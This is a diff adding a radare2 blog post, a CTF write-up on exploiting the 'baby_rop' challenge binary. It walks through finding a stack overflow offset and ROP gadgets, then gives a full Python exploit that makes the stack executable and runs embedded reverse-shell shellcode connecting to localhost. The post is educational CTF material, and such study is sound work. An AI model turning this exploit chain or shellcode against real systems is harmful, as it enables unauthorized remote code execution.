@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en-us">
+	<head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="The radare team">
+<meta name="description" content="The blog of radare2">
+<meta name="generator" content="Hugo 0.74.3" />
+<title>Defeating baby_rop with radare2</title>
+<link rel="shortcut icon" href="https://radareorg.github.io/blog/images/favicon.ico">
+<link rel="stylesheet" href="https://radareorg.github.io/blog/css/style.css">
+<link rel="stylesheet" href="https://radareorg.github.io/blog/css/highlight.css">
+
+
+
+<link rel="stylesheet" href="https://radareorg.github.io/blog/css/monosocialiconsfont.css">
+
+
+
+<link href="https://radareorg.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="The Official Radare Blog" />
+
+
+<meta property="og:title" content="Defeating baby_rop with radare2" />
+<meta property="og:description" content="In order to content the people that wanted something less hand-holding than this writeup which they say is too detailed and this one not enough, we decided to write this blogpost: not too short, not too long, and about pwning!
+The binary was a challenge (called baby_rop) from a small CTF that took place in France, called the sthack.
+As always, if you don&rsquo;t get a command, append ? to it to get documentation." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://radareorg.github.io/blog/posts/defeating-baby_rop-with-radare2/" />
+<meta property="article:published_time" content="2015-05-19T23:55:59+02:00" />
+<meta property="article:modified_time" content="2015-05-19T23:55:59+02:00" />
+
+
+<meta itemprop="name" content="Defeating baby_rop with radare2">
+<meta itemprop="description" content="In order to content the people that wanted something less hand-holding than this writeup which they say is too detailed and this one not enough, we decided to write this blogpost: not too short, not too long, and about pwning!
+The binary was a challenge (called baby_rop) from a small CTF that took place in France, called the sthack.
+As always, if you don&rsquo;t get a command, append ? to it to get documentation.">
+<meta itemprop="datePublished" content="2015-05-19T23:55:59+02:00" />
+<meta itemprop="dateModified" content="2015-05-19T23:55:59+02:00" />
+<meta itemprop="wordCount" content="1191">
+
+
+
+<meta itemprop="keywords" content="" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Defeating baby_rop with radare2"/>
+<meta name="twitter:description" content="In order to content the people that wanted something less hand-holding than this writeup which they say is too detailed and this one not enough, we decided to write this blogpost: not too short, not too long, and about pwning!
+The binary was a challenge (called baby_rop) from a small CTF that took place in France, called the sthack.
+As always, if you don&rsquo;t get a command, append ? to it to get documentation."/>
+
+
+    </head>
+<body>
+    <nav class="main-nav">
+	
+		<a href='https://radareorg.github.io/blog'> <span class="arrow">←</span>Home</a>
+	
+
+	
+
+	
+		<a class="cta" href="https://radareorg.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+    <section id="wrapper">
+        
+        
+<article class="post">
+    <header>
+        <h1>Defeating baby_rop with radare2</h1>
+        <h2 class="subtitle"></h2>
+        <h2 class="headline">
+        May 19, 2015
+        <br>
+        
+        </h2>
+    </header>
+    <section id="post-body">
+        <p>In order to content the people that wanted something less hand-holding than <a href="http://dustri.org/b/exploiting-ezhp-pwn200-from-plaidctf-2014-with-radare2.html">this</a> writeup which they say is too detailed and <a href="http://radare.today/using-radare2/">this</a> one not enough, we decided to write this blogpost: not too short, not too long, and about pwning!</p>
+<p>The <a href="http://bin.radare.today/baby_rop">binary</a> was a challenge (called <code>baby_rop</code>) from a small CTF that took place in France, called the <a href="https://www.sthack.fr/">sthack</a>.</p>
+<p>As always, if you don&rsquo;t get a command, append <code>?</code> to it to get documentation.</p>
+<p>Ready? go!</p>
+<pre><code>$ r2 baby_rop
+Warning: Cannot initialize dynamic section
+ -- Experts agree, security holes suck, and we fixed some of them!
+[0x08048e28]&gt; ii
+[Imports]
+
+0 imports
+</code></pre><p>No imports. A static binary?</p>
+<pre><code>[0x08048e28]&gt; iI~static
+static   true
+[0x08048e28]&gt; is~?
+1982
+</code></pre><p>Reversing the main function is left as an exercice to the reader;
+it&rsquo;s a classic forking server, saying &ldquo;Hello!&rdquo;, asking for a size and a string, and copying the data into it. What could possibly go wrong?</p>
+<p>So, we just need to ROP our way into system, and that&rsquo;s it!</p>
+<pre><code>[0x08048e28]&gt; is~system
+vaddr=0x080d7a50 paddr=0x0008fa50 ord=084 fwd=NONE sz=20 bind=LOCAL type=OBJECT name=system_dirs
+[0x08048e28]&gt; is~exec
+vaddr=0x080bd040 paddr=0x00075040 ord=908 fwd=NONE sz=2680 bind=LOCAL type=FUNC name=execute_stack_op
+vaddr=0x080bdf10 paddr=0x00075f10 ord=911 fwd=NONE sz=2203 bind=LOCAL type=FUNC name=execute_cfa_program
+vaddr=0x080ef1a8 paddr=0x000a71a8 ord=961 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=__have_o_cloexec
+vaddr=0x080a53d0 paddr=0x0005d3d0 ord=1092 fwd=NONE sz=90 bind=GLOBAL type=FUNC name=_dl_make_stack_executable
+vaddr=0x080eda14 paddr=0x000a5a14 ord=2141 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=_dl_make_stack_executable_hook
+[0x08048e28]&gt; 
+</code></pre><p>Hoho, here is the trick! No <em>system</em> nor <em>execve</em>. It seems that we will have to craft a good old ROP chain, dup2 magic, write a <code>/bin/sh</code> string somewhere, to finally call <code>execve</code> on it.</p>
+<p>Or, we can check what the <code>_dl_make_stack_executable</code> function does ;)</p>
+<pre><code>[0x08048e28]&gt; pdf @ sym._dl_make_stack_executable
+╒ (fcn) sym._dl_make_stack_executable 90
+│          ;-- sym._dl_make_stack_executable:
+│          0x080a53d0    53             push ebx
+│          0x080a53d1    89c3           mov ebx, eax
+│          0x080a53d3    83ec18         sub esp, 0x18
+│          0x080a53d6    8b08           mov ecx, dword [eax]
+│          0x080a53d8    a128da0e08     mov eax, dword [sym._dl_pagesize]  ; [0x80eda28:4]=0x1000  ; sym._dl_pagesize
+│          0x080a53dd    89c2           mov edx, eax
+│          0x080a53df    f7da           neg edx
+│          0x080a53e1    21ca           and edx, ecx
+│          0x080a53e3    3b0d64cf0e08   cmp ecx, dword [sym.__libc_stack_end]  ; [0x80ecf64:4]=0 ; sym.__libc_stack_end
+│      ┌─&lt; 0x080a53e9    752e           jne 0x80a5419           
+│      │   0x080a53eb    8b0dc4cf0e08   mov ecx, dword [sym.__stack_prot]  ; [0x80ecfc4:4]=0x1000000  ; sym.__stack_prot
+│      │   0x080a53f1    89442404       mov dword [esp + 4], eax    ; [0x4:4]=0x3010101 
+│      │   0x080a53f5    891424         mov dword [esp], edx
+│      │   0x080a53f8    894c2408       mov dword [esp + 8], ecx    ; [0x8:4]=0
+│      │   0x080a53fc    e81fa9fcff     call sym.mprotect           ; sym.__waitpid+0x1b90
+│      │      sym.__waitpid() ; sym.__mprotect
+│      │   0x080a5401    85c0           test eax, eax
+│     ┌──&lt; 0x080a5403    751b           jne 0x80a5420         
+│     ││   0x080a5405    c70300000000   mov dword [ebx], 0
+│     ││   0x080a540b    31c0           xor eax, eax
+│     ││   0x080a540d    830d18da0e08.  or dword [sym._dl_stack_flags], 1
+│    ┌     ; JMP XREF from 0x080a541e (sym._dl_make_stack_executable)
+│    ┌     ; JMP XREF from 0x080a5428 (sym._dl_make_stack_executable)
+│    ┌───&gt; 0x080a5414    83c418         add esp, 0x18
+│    │││   0x080a5417    5b             pop ebx
+│    │││   0x080a5418    c3             ret
+│    ││└   ; JMP XREF from 0x080a53e9 (sym._dl_make_stack_executable)
+│    ││└─&gt; 0x080a5419    b801000000     mov eax, 1
+│    └───&lt; 0x080a541e    ebf4           jmp 0x80a5414       
+│     └    ; JMP XREF from 0x080a5403 (sym._dl_make_stack_executable)
+│     └──&gt; 0x080a5420    b8d4ffffff     mov eax, 0xffffffd4    ; -44
+│          0x080a5425    658b00         mov eax, dword gs:[eax]
+╘          0x080a5428    ebea           jmp 0x80a5414               
+[0x08048e28]&gt;
+</code></pre><p>Looks like a simple wrapper to mprotect, we just have to set <code>__stack_prot</code> to 7, and we&rsquo;ve got a nice executable stack!</p>
+<p>Time to figure how much we have to send to overwrite the <em>ret address</em>:</p>
+<pre><code>$ r2 -d rarun2 program=./baby_rop arg1=4444
+Process with PID 3630 started...
+PID = 3630
+pid = 3630 tid = 3630
+r_debug_select: 3630 3630
+Using BADDR 0x400000
+Asuming filepath /usr/local/bin/rarun2
+bits 64
+pid = 3630 tid = 3630
+ -- Enable ascii-art jump lines in disassembly by setting 'e asm.lines=true'. asm.linesout and asm.linestyle may interest you as well
+[0x7fdf3649ccd0]&gt; e dbg.forks = true  # we want to &quot;follow&quot; forks
+pid = 3630 tid = 3630
+[0x7fdf3649ccd0]&gt; dc
+r_debug_select: 3630 1
+[0x08048e28]&gt; dc
+[+] Socket created.
+</code></pre><p>We can now launch our ghetto-client:</p>
+<pre><code>echo &quot;1234`ragg2 -P 100 -r`&quot; | nc 127.01 4444
+</code></pre><p>Back to radare2:</p>
+<pre><code>[+] Listening on 4444.
+[+] New client : 127.0.0.1
+[0xf770ac10]&gt; dp
+Selected: 3630 1
+ * 3630 s (current)
+ - 3629 s (ppid)
+ - 3633 s ./baby_rop
+[0xf770ac10]&gt; dpa 3633
+pid = 3633 tid = 3633
+r_debug_select: 3633 3633
+[0xf770ac10]&gt; dc
+[+] SIGNAL 11 errno=0 addr=0x41574141 code=1 ret=0
+r_debug_select: 3633 1
+[+] signal 11 aka SIGSEGV received 0
+[0x41574141]&gt; dr=
+ r15 0x00000000         r14 0x00000000         r13 0x00000000
+ r12 0x00000000         rbp 0x56414155         rbx 0x41415441
+ r11 0x00000000         r10 0x00000000          r9 0x00000000
+  r8 0x00000000         rax 0xffffffff         rcx 0xffebd890
+ rdx 0x00000065         rsi 0x080ed00c         rdi 0x08049b30
+orax 0xffffffffffffffff rip 0x41574141         rflags = 1PSIV
+ rsp 0xffebd920        
+[0x41574141]&gt; woO 0x41574141
+64
+[0x41574141]&gt; 
+</code></pre><p>So, our shellcode will look like this: <code>[an int][padding on 64 bits][payload]</code>.</p>
+<p>Our payload will:</p>
+<ol>
+<li>set the global variable <code>__stack_prot</code> to 7
+<ol>
+<li>Set a register to <code>0xfffffff</code> (no NULL bytes)</li>
+<li>Increment it 8 times, to make it equal to 7</li>
+<li>Overwrite <code>__stack_prot</code> with it</li>
+</ol>
+</li>
+<li>call <code>_dl_make_stack_executable</code> on the stack</li>
+<li>jump to <code>esp</code></li>
+</ol>
+<pre><code>[0x08048e28]&gt; e rop.len = 2
+[0x08048e28]&gt; e search.count = 2
+[0x08048e28]&gt; &quot;/R/ pop ebx;ret&quot;
+  0x080481c5             5b  pop ebx
+  0x080481c6             c3  ret
+
+  0x0804d826             5b  pop ebx
+  0x0804d827             c3  ret
+
+[0x08048e28]&gt; 
+</code></pre><p>Without the first command, radare2 would have returned us things like <code>pop ebx; mov eax, 3; ret</code>; the second is because we just want one gadget with a second one in backup in case of a NULL byte in the offset.</p>
+<p>The search command is fully quoted because <code>;</code> is used to chain r2 commands, and quoting the whole command instead of doing something else greatly simplify the parsing.</p>
+<p>Because we&rsquo;re lazy, we&rsquo;ll use a regexp to find the other ones:</p>
+<pre><code>[0x08048e28]&gt; &quot;/R/ pop e[dca]x;ret&quot;
+  0x0806da92             5a  pop edx
+  0x0806da93         c2fdff  ret 0xfffd
+
+  0x08070f9c             5a  pop edx
+  0x08070f9d             c3  ret
+
+  0x08083ca3             59  pop ecx
+  0x08083ca4             c3  ret
+
+  0x080abee4             58  pop eax
+  0x080abee5             cb  retf
+
+  0x080bf3b6             58  pop eax
+  0x080bf3b7             c3  ret
+
+  0x080dcabf             5a  pop edx
+  0x080dcac0             cb  retf
+
+  0x080dd55f             58  pop eax
+  0x080dd560             cb  retf
+
+  0x080dda1a             59  pop ecx
+  0x080dda1b             cf  iretd
+
+  0x080e799e             58  pop eax
+  0x080e799f             c3  ret
+
+  0x080e8d98             58  pop eax
+  0x080e8d99             c3  ret
+
+  0x080ea630             58  pop eax
+  0x080ea631         c20000  ret 0
+
+  0x080eae30             58  pop eax
+  0x080eae31             ca0000  retf 0
+
+  0x080eb330             58  pop eax
+  0x080eb331             cf  iretd
+
+[0x08048e28]&gt;
+</code></pre><p>Looking for the other required one is left as an exercice for the reader.</p>
+<p>Here is our full exploit:</p>
+<pre><code>#!/usr/bin/python
+
+import struct
+import socket
+
+# Reverse shell on localhost:1337
+shellcode = (b&quot;\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80&quot;
+             b&quot;\x92\xb0\x66\x68&quot;
+             b&quot;\x7f\x01\x01\x01&quot; # ip addr
+             b&quot;\x66\x68&quot;
+             b&quot;\x05\x39&quot; # port
+             b&quot;\x43\x66\x53\x89&quot;
+             b&quot;\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0&quot;
+             b&quot;\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73&quot;
+             b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;);
+
+def rop(*args):
+        return struct.pack('I'*len(args), *args)
+
+
+s = socket.create_connection(('localhost', 5555))
+
+s.recv(1337)
+
+payload = rop(1337) + 'A' * 64  # padding
+
+# set __stack_prot to 7
+payload += rop(
+    0x08070f9c, # pop edx; ret;
+    0x080ecfc4, # __stack_prot
+    0x08083ca3, # pop ecx; ret;
+    0xffffffff, # -1
+    )
+for i in range(0, 8):
+    payload += rop(0x080de4ee) # inc ecx; ret; 8 times
+payload += rop(0x080e5efa) # add dword ptr [edx], ecx
+
+# make our stack executable, and jump to the shellcode
+payload += rop(
+    0x080bf3b6,  # pop eax; ret;
+    0x080ecf64,  # _libc_stack_end
+    0x080a53d0,  # _dl_make_stack_executable
+    0x080c4bb3   # call esp
+    )
+
+payload += shellcode
+
+s.send(payload + '\n')
+</code></pre><p>And now, feel free to check what every command does by appending <code>?</code> to it, and try to recreate this exploit from scratch ;)</p>
+
+    </section>
+</article>
+
+<footer id="post-meta" class="clearfix">
+    <a href="https://twitter.com/radareorg">
+    <img class="avatar" src="https://radareorg.github.io/blog/images/avatar.png">
+    <div>
+        <span class="dark">The radare team</span>
+        <span></span>
+    </div>
+    </a>
+    <section id="sharing">
+        <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fradareorg.github.io%2fblog%2fposts%2fdefeating-baby_rop-with-radare2%2f - Defeating%20baby_rop%20with%20radare2 by @radareorg"><span class="icon-twitter"> https://twitter.com/radareorg</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+    </section>
+</footer>
+
+
+
+<ul id="post-list" class="archive readmore">
+    <h3>Read more</h3>
+
+    
+    
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/sleigh_disassembler_backend/">GSoC 2020: SLEIGH Disassembler Backend<aside class="dates">Sep 6 2020</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/rsoc-2019-console-interface-improvement/">RSoC 2019 Final: Console Interface Improvements<aside class="dates">Oct 1 2019</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/rsoc-2019-selection/">Radare2 Summer of Code 2019 Selection Results<aside class="dates">Apr 2 2019</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/radare2-survey/">Radare2 Community Survey Results<aside class="dates">Feb 2 2019</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/radare2-bioinformatics/">Radare2 and bioinformatics: a good match?<aside class="dates">Aug 31 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/cutter_debug/">GSoC 2018 Final: Debugging and Emulation Support for Cutter<aside class="dates">Aug 20 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/cli_improvements/">GSoC 2018 Final: Console Interface Improvementes<aside class="dates">Aug 19 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/gsoc_2018_radeco_cfs/">GSoC 2018: Control Flow Structuring for Radeco-lib<aside class="dates">Aug 12 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/gsoc_2018_radeco_pseudo_c_code_generation/">Gsoc 2018 Radeco Pseudo C Code Generation<aside class="dates">Aug 12 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/type_inference/">GSoC&#39;18 Final: Type inference<aside class="dates">Aug 12 2018</aside></a>
+        </li>
+    
+</ul>
+
+
+
+        <footer id="footer">
+    
+    <p class="small">
+    
+        The radare team
+    
+    </p>
+</footer>
+
+    </section>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://radareorg.github.io/blog/js/main.js"></script>
+<script src="https://radareorg.github.io/blog/js/highlight.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+</body>
+</html>
